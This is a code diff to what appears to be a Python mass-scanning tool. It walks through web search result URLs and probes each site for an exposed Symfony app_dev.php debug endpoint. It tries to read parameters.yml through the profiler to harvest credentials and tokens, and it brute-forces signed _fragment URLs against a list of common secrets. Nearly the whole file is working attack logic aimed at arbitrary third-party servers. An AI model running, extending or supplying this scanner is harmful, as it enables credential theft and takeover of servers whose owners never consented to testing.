@@ -167,7 +167,7 @@ USUAL_SECRETS = [
 ]
 
 
-def check_url(url):
+def fix_url(url):
 	"""
 	This function give a valid url without parameters
 	"""
@@ -178,6 +178,19 @@ def check_url(url):
 		delVal = str(newList[len(newList)-1])
 		url = url.replace(delVal,'')
 	return url
+
+def fix_index_url(url,content):
+	"""
+	This function give a valid url (url maybe changed)
+	"""
+	if(re.search(".*Index of.*",content)):
+		path = content.split('Index of ')[1].split('</title>')[0]
+		if path == '/':
+			url = url.split('://')[0]+'://'+url.split('/')[2]+path
+		else:
+			url = url.split('://')[0]+'://'+url.split('/')[2]+path+'/'
+	return url
+
 
 
 def compute_hmac(secret, data, algo):
@@ -254,13 +267,15 @@ try:
 		if(url == "#" or url == None or re.search(".*google..*", url) or re.search("^/search?.*", url) or not re.search("^http.*", url)):
 			pass
 		else:
-			url = check_url(url)
+			url = fix_url(url)
 			try:
+				check0 = requests.get(url, verify=False, timeout=5)
+				url = fix_index_url(url,check0.text)
 				check1 = requests.get(url+'app_dev.php', verify=False, timeout=5)
 				check2 = requests.get(url+'app_dev.php/_profiler/open?file=app/config/parameters.yml', verify=False, timeout=5)
 				check3 = requests.get(url+'app_dev.php/_configurator/final', verify=False, timeout=5)
 				check4 = requests.get(url+'app_dev.php/_fragment', verify=False, timeout=5)
-				if(check1.status_code != 403 and len(check1.content) != 80 and len(check1.content) != 0 and re.search(".*app_dev.php.*", str(check1.content))):
+				if(check1.status_code != 403):
 					if(check2.url == url+'app_dev.php/_profiler/open?file=app/config/parameters.yml' and check2.status_code == 200 and not re.search(".*Token not found.*", str(check2.content))):
 						if(check4.status_code == 403):
 							print(color.green+'[+] {}app_dev.php/_profiler/open?file=app/config/parameters.yml is vulnerable [Token and creds found] [_fragment found]'.format(url))
@@ -284,7 +299,7 @@ try:
 							totalMutation = len(mutations)
 							for algo, secret, internal_url in mutations:
 								nbMut = nbMut + 1
-								print(color.blue+'[?] {} Trying Token {}/{} ...\r'.format(url,nbMut,totalMutation),end="")
+								print(color.blue+'[?] {} Trying Token {}/{} ...\r'.format(internal_url,nbMut,totalMutation),end="")
 								urlToken = build_url_with_hash(urlFragment, internal_url, secret, algo)
 								response = requests.get(urlToken)
 								code = response.status_code
@@ -293,13 +308,13 @@ try:
 									countVuln = countVuln + 1
 									totalUrl = totalUrl + 1
 									break
-								elif nbMut == totalMutation:
-									print(color.orange+'[!] {} maybe vulnerable [Token or internal url not found]'.format(internal_url)+color.green+' [_fragment found]')
-									nbMut = 0
-									totalUrl = totalUrl + 1
-									break
 								else:
 									pass
+							else:
+								print(color.orange+'[!] {} maybe vulnerable [Token or internal url not found]'.format(internal_url)+color.green+' [_fragment found]')
+								nbMut = 0
+								totalUrl = totalUrl + 1
+
 						else:
 							print(color.orange+'[!] {} maybe vulnerable [bruteforce skiped]'.format(url))
 							totalUrl = totalUrl + 1
